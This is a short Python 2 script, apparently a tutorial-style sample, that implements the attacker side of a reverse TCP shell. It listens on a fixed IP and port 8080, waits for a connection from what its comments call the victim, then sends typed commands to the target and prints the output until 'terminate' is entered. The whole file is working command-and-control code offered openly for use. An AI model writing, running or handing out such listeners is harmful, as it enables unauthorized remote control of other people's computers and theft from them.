# Reverse TCP Shell Server 
# By Sentinel Warren

import socket    # For Building TCP Connection -- AF_INET
def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # We are creating a object S here.
    s.bind(("192.168.0.118", 8080))                        # WE will define IP address and port number (In Your Case,Find your IP Adrees with 'ifconfig'' Command)
    s.listen(1)                                            # Number of connections.
    
    print '[+] Listening for incoming TCP connection'
    print '[+] Shell Is running'
    conn, addr = s.accept()     #Function.
    
    print '[+] We got a connection from: ', addr  #IP address of the victim will be display
    while True:
        command = raw_input("Shell> ")   # Input
        if 'terminate' in command:        # Terminate Loop
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)    # Otherwise we will send the command to the target
            print conn.recv(1024) # and print the result that we got back        
def main ():
    connect()
main()